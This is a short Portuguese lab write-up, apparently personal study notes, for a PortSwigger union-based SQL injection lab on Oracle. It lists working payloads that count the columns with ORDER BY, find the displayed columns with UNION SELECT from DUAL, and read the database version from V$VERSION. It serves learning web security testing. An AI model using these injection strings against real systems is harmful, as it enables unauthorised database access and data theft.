---
description: SQL INJECTION UNION BASED
---

# Lab portswigger (SQL injection attack, querying the database type and version on Oracle)

<mark style="color:green;">Encontrar número de colunas: /filter?category=Lifestyle' ORDER BY 2 --</mark>

<mark style="color:orange;">(no final do link, colocar ' ORDER BY 1, 2 ou 3, até você descobrir o número de colunas que tem no banco de dados).</mark>

<mark style="color:green;">' UNION SELECT 'COLUNA 1', 'COLUNA 2' FROM DUAL --</mark> <mark style="color:orange;">(Esse comando, serve para separar as colunas, para que ela mostre no site, e você saiba em qual você vai injetar o comando requerido).</mark>

<mark style="color:green;">' UNION SELECT BANNER, 'COLUNA 2' FROM V$VERSION --</mark> <mark style="color:orange;">(Trocando o "COLUNA 1" por BANNER para injetar o comando "V$VERSION" que é a função de ver o banco de dados no oracle, com isso vai aparecer no lugar da coluna 1 "CORE 11.2.0.2.0 Production", que é o objetivo do lab.</mark>
